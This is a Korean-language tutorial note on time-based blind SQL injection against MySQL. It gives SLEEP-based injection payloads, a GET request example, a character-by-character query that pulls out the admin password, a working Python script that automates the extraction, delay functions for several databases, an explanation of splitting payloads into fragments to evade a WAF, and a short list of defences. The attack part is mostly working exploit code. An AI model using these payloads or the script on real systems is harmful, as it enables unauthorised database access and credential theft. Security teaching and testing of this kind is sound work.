`Time-Based Blind SQL Injection` 
서버의 응답 지연을 이용해서 참/거짓 여부를 알아내는 기법

## 💡 핵심 개념

* **"true" 조건이면 서버가 `SLEEP(n)` 하게 만들고**,
* **"false"면 바로 응답** → 응답 시간 차이를 보고 판단

예를 들어:

```sql
' OR IF(1=1, SLEEP(5), 0) -- 
```

응답이 5초 이상 걸리면 → 참 조건

---

## ✅ 기본 구조 (MySQL 기준)

**기존 쿼리**가 예를 들어:

```sql
SELECT * FROM users WHERE username = '$input';
```

### 💥 공격 페이로드:

```sql
' OR IF(1=1, SLEEP(5), 0) -- 
```

최종 쿼리:

```sql
SELECT * FROM users WHERE username = '' OR IF(1=1, SLEEP(5), 0) -- ';
```

응답이 **5초 이상 걸리면** → 조건이 참이었음.

---

## 🧪 실습 예제 (GET 요청 기반)

### 📌 대상 URL 예시:

```
http://example.com/login.php?user=admin' AND IF(1=1, SLEEP(5), 0)-- -
```

* 응답이 느리면 → 조건이 참
* 바로 응답하면 → 조건이 거짓

---

## 🔁 참/거짓으로 데이터 추출 (문자 하나씩 비교)

예: 관리자 비밀번호 첫 글자가 `'a'`인지 확인

```sql
' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'a', SLEEP(5), 0) -- 
```

> 이 요청이 5초 이상 걸리면 → 첫 글자가 'a'라는 뜻

---

## 🔄 반복적으로 사용해 전체 문자열 추출 가능

### Python을 써서 자동화하면:

```python
import requests
import time
import string

url = "http://example.com/login.php?user=admin' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'), {pos}, 1)='{char}', SLEEP(5), 0)-- -"
charset = string.ascii_lowercase + string.digits
password = ''

for pos in range(1, 33):  # 비밀번호 길이에 따라 조정
    for char in charset:
        start = time.time()
        r = requests.get(url.format(pos=pos, char=char))
        elapsed = time.time() - start

        if elapsed > 4:  # SLEEP(5)이면 약 5초 걸림
            password += char
            print(f"Found character {pos}: {char}")
            break

print("Password:", password)
```

---

## ✅ 주요 DB별 SLEEP 함수

| DBMS       | Time-delay 함수           |
| ---------- | ----------------------- |
| MySQL      | `SLEEP(n)`              |
| PostgreSQL | `pg_sleep(n)`           |
| MSSQL      | `WAITFOR DELAY '0:0:n'` |
| Oracle     | `dbms_lock.sleep(n)`    |

---

## 💡 payload fragment

* **응답 시간 차이로 정보 탈취** 가능

```
;SELECT SL
```

* `;` → 명령어 분리자
* `SELECT SL` → SELECT 문 시작 시도, 이어지는 `SL`은 `SLEEP`, `SLUG`, `SLOT` 등 다양한 함수/필드의 일부일 가능성



### 🕵️‍♂️ 왜 이렇게 문자열이 끊겼을까?

* `SLEEP(6)` 같은 명령이 탐지를 피하려고 **분할되어 전송**됐을 가능성 있음
  예: `;SELECT SL` → `EEP(6)` (다음 요청에서)

이것은 **WAF 우회 및 탐지 회피**를 위한 **payload fragmentation** 기법의 흔한 사례입니다.

---

### 🎯 공격자의 의도

* **WAF를 우회**하고 SELECT 함수 또는 SLEEP 함수 실행
* 전체 페이로드가 다음과 같이 조립될 수 있음:

  ```sql
  ;SELECT SLEEP(6)
  ```

* SQL 명령어 일부만 탐지되더라도, 조립되면 **DB 서버 명령 실행**

---

### 🛡 대응 방안

* WAF에 조각 문자열 탐지 룰 추가 (예: `;SELECT`, `SELECT SL`)
* SQL 키워드가 **비정상적인 위치**에 등장할 경우 차단
* 입력값에 **비알파벳 문자열 포함 (`;`, `(`, `)`)** 여부 체크
